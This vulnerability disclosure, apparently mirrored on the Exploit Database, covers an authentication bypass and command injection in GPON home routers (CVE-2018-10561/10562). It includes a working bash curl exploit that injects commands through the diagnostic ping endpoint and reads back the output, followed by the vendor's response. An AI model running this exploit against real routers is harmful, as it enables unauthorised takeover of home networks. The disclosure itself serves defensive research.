# Critical RCE Vulnerability Found in Over a Million GPON Home Routers

Here at vpnMentor, we are concerned about your security and privacy. Our special team of hackers & researchers roam the internet to find security issues in sensitive products. We found this RCE vulnerability in the majority of GPON home routers. Read more to find out how we exploited this vulnerability and what you can do about it. Share

## **Important update since this report was published:**

* DASAN Zhone Solutions sent us their comment on the report. We attach it "as is" at the end of this page.

## **Overview:**

We executed an all-encompassing evaluation of a variety of GPON home routers. It is known that a significant number of today's routers operate using GPON internet, and **we have discovered a strategy to override all device authentication protocols (CVE-2018-10561)**. This bypass of the authentication process **further revealed an additional command injection flaw (CVE-2018-10562), giving us the capacity to carry out commands on the given device.**

## **Exploitation:**

During our analysis of GPON firmwares, we found two different critical vulnerabilities (CVE-2018-10561 & CVE-2018-10562)  that could, when combined allow complete control on the device and therefore the network. The first vulnerability exploits the authentication mechanism of the device that has a flaw. This flaw allows any attacker to bypass all authentication.

The flaw can be found with the HTTP servers, which check for specific paths when authenticating. This allows the attacker to bypass authentication on any endpoint using a simple trick.

By appending ?images/ to the URL, the attacker can bypass the endpoint.

This works on both HTML pages and GponForm/

For instance, by inserting

/menu.html?images/

or

/GponForm/diag\_FORM?images/

we can manage the device.

While looking through the device functionalities, we noticed the diagnostic endpoint contained the ping and traceroute commands. It didn’t take much to figure out that the commands can be injected by the host parameter.

Since the router saves ping results in /tmp and transmits it to the user when the user revisits /diag.html, it’s quite simple to execute commands and retrieve their output with the authentication bypass vulnerability.

We include the following bash version of the exploit code:

#!/bin/bash

echo "[+] Sending the Command... "

# We send the commands with two modes backtick (`) and semicolon (;) because different models trigger on different devices

curl -k -d "XWebPageName=diag&diag\_action=ping&wan\_conlist=0&dest\_host=\`$2\`;$2&ipv=0" $1/GponForm/diag\_Form?images/ 2>/dev/null 1>/dev/null

echo "[+] Waiting...."

sleep 3

echo "[+] Retrieving the ouput...."

curl -k $1/diag.html?images/ 2>/dev/null | grep 'diag\_result = ' | sed -e 's/\\n/\n/g'

## **Impact:**

GPON is a type of passive optical network that uses fiber-optics and is particularly popular. When people use GPON, the routers are provided by ISPs. **Over one million people use this type of network system router**.

We tested this vulnerability on many random GPON routers, and **the vulnerability was found on all of them**. Because so many people use these types of routers, **this vulnerability can result in an entire network compromise**.

## **Recommendations:**

1. Check if your router uses the GPON network.
2. Be aware that GPON routers can be hacked and exploited.
3. Talk to your ISP to see what they can do to fix the bug.
4. Warn your friends on Facebook ([click here to share](https://www.facebook.com/sharer/sharer.php?u=https%3A//www.vpnmentor.com/blog/critical-vulnerability-gpon-routers/)) and Twitter ([click here to tweet](https://twitter.com/home?status=https%3A//www.vpnmentor.com/blog/critical-vulnerability-gpon-routers/)).

## **Update: Statement from DZS regarding authentication bypass exploit**

DASAN Zhone Solutions, Inc. has investigated recent media reports that certain DZS GPON Network Interface Devices (NIDs), more commonly known as routers, could be vulnerable to an authentication bypass exploit.

DZS has determined that the ZNID-GPON-25xx series and certain H640series GPON ONTs, when operating on specific software releases, are affected by this vulnerability. No service impacts from this vulnerability have been reported to DZS to date. After an internal investigation, we have determined the potential impact is much more limited in scope than reported by vpnMentor. According to DZS sales records, combined with field data gathered to date, we have estimated that the number of GPON ONT units that may be potentially impacted to be less than 240,000. In addition, given the relative maturity of the products in their lifecycle, we think the impact is limited to even fewer devices.

**Product History**

The DZS ZNID-GPON-25xx and certain H640-series ONTs, including the software that introduced this vulnerability, were developed by an OEM supplier and resold by DZS. Designed and released more than 9 years ago, most of these products are now well past their sustainable service life. Because software support contracts are no longer offered for most of these products, we do not have direct insight to the total number of units that are still actively used in the field.

**Resolution**

DZS has informed all the customers who purchased these models of the vulnerability. We are working with each customer to help them assess methods to address the issue for units that may still be installed in the field. It will be up to the discretion of each customer to decide how to address the condition for their deployed equipment.

DZS’s mission is to ensure that all its solutions meet the highest security standards in the industry. We embrace this, and every opportunity, to review and continuously improve our security design and testing methodologies.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
